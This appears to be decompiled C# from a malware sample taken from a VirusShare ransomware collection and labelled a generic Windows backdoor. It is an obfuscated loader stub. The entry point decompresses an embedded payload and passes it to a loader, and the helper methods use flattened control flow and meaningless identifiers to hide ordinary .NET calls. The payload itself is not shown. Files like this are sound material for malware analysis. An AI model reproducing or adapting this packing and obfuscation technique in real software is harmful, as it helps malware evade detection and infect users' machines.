// Decompiled with JetBrains decompiler
// Type: Ⴐ.Ⴅ
// Assembly: stub, Version=6.2.15.2, Culture=neutral, PublicKeyToken=null
// MVID: 6CAE2B56-3E3C-414E-A63C-DF5759216B41
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-fefe5fdbb5033afd192cecb9321003caa0fb5f0e90356caaf380add059a71ae0.exe

using Microsoft.VisualBasic.CompilerServices;
using stub;
using System;
using System.Collections;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Windows.Forms;

namespace Ⴐ
{
  [StandardModule]
  internal sealed class Ⴅ
  {
    [STAThread]
    public static void Ⴐ()
    {
      Ⴐ.Ⴈ.Ⴃ();
      int num = 2;
      byte[] VjChHeRxxJmcBZUAaiKqo;
      while (true)
      {
        switch (num)
        {
          case 1:
            goto label_4;
          case 3:
            goto label_3;
          default:
            VjChHeRxxJmcBZUAaiKqo = stub.Compression.Decompress(Ⴐ.Ⴗ.Ⴄ(Ⴐ.Ⴗ.ႭႠ(118, 91)));
            num = 3;
            continue;
        }
      }
label_4:
      return;
label_3:
      jNcCIrAWztmAMRvBsnzvBwmIujgObJQCEIaDRmGbPFa.AvqKxZGTSjlYqXJkcrPJMbMgPWaFQV(VjChHeRxxJmcBZUAaiKqo, Ⴐ.Ⴗ.ႭႠ(814, 771));
    }

    static Ⴅ() => Ⴐ.Ⴈ.Ⴃ();

    internal static bool Ⴅ([In] Hashtable obj0, [In] object obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 27:
          num1 = 6;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
          case 6:
            goto label_8;
          case 2:
          case 7:
            num2 = 4;
            continue;
          case 4:
            goto label_3;
          case 5:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴅ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.ContainsKey(obj1);
    }

    internal static object Ⴓ([In] object obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 125:
          num1 = 2;
          break;
        default:
          num1 = 6;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
          case 2:
            goto label_8;
          case 4:
          case 7:
            goto label_3;
          case 5:
            num2 = 4;
            continue;
          case 6:
            num2 = 4;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴓ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return RuntimeHelpers.GetObjectValue(obj0);
    }

    internal static int Ⴃ([In] GZipStream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_3:
      int num1;
      switch (obj5 ^ obj4)
      {
        case 113:
          num1 = 6;
          break;
        default:
          num1 = 3;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 1:
            num2 = 4;
            continue;
          case 2:
          case 5:
          case 6:
            goto label_8;
          case 3:
            num2 = 4;
            continue;
          case 4:
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴐ.Ⴅ.Ⴃ);
            num2 = 4;
            continue;
        }
      }
label_8:
      return obj0.Read(obj1, obj2, obj3);
    }

    internal static void Ⴍ([In] Control obj0, [In] int obj1, [In] int obj2)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_8;
          case 2:
          case 3:
          case 5:
            goto label_7;
          case 4:
            num1 = 1;
            continue;
          default:
            int num2;
            switch (obj2 ^ obj1)
            {
              case 32:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.SuspendLayout();
    }

    internal static object Ⴈ([In] AppDomain obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 57)
      {
        case 0:
          return obj0.GetData(obj1);
        default:
          goto label_0;
      }
    }

    internal static void Ⴄ([In] Array obj0, [In] RuntimeFieldHandle obj1, [In] int obj2, [In] int obj3)
    {
label_0:
      switch ((obj3 ^ obj2) - 30)
      {
        case 0:
          RuntimeHelpers.InitializeArray(obj0, obj1);
          break;
        default:
          goto label_0;
      }
    }

    internal static Evidence Ⴀ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 89)
      {
        case 0:
          return obj0.Evidence;
        default:
          goto label_0;
      }
    }

    internal static string[] Ⴗ([In] Assembly obj0, [In] int obj1, [In] int obj2)
    {
label_0:
      switch ((obj2 ^ obj1) - 71)
      {
        case 0:
          return obj0.GetManifestResourceNames();
        default:
          goto label_0;
      }
    }
  }
}
